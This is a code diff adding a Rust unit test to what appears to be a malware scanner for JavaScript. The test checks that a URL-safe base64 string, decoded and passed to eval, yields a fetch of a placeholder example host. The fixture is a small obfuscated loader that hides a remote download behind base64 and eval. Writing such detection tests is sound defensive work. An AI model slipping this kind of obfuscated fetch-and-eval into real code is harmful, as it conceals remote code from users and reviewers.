@@ -20284,6 +20284,26 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_buffer_from_base64_urlsafe_alphabet_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = "ZmV0Y2goJ2h0dHBzOi8vYnVmZmVyLWJhc2U2NHVybC1qcy5leGFtcGxlL3A_eD0wJyk";
+        let js = format!(r#"eval(Buffer.from("{encoded}", "base64").toString())"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://buffer-base64url-js.example/p?x=0"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from base64 URL-safe alphabet payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_buffer_from_bind_base64_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
